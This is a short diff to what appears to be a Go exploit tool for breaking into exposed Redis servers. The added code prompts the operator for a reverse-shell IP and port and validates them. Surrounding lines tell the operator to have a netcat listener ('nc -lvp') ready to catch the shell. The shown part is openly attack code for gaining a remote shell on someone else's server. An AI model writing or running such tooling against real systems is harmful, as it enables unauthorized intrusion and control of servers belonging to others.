@@ -66,6 +66,26 @@ func (h *Hik) exploit() {
 		log.SetPrefix("[-] ")
 		log.Fatalln("Can Not Connect To Target's Redis.")
 	}
+	for {
+		fmt.Printf("Input Reverse IP:")
+		fmt.Scanf("%s\n", &h.IP)
+		if IPChecker(h.IP) {
+			break
+		} else {
+			log.SetPrefix("[!] ")
+			log.Println("Reverse IP Invalid")
+		}
+	}
+	for {
+		fmt.Printf("Input Reverse Port:")
+		fmt.Scanf("%s\n", &h.Port)
+		if PortChecker(h.Port) {
+			break
+		} else {
+			log.SetPrefix("[!] ")
+			log.Println("Reverse Port Invalid")
+		}
+	}
 	log.SetPrefix("[!] ")
 	log.Printf("Reserve Server %s Ready?????[nc -lvp %s]:", h.IP, h.Port)
 	fmt.Scanln()
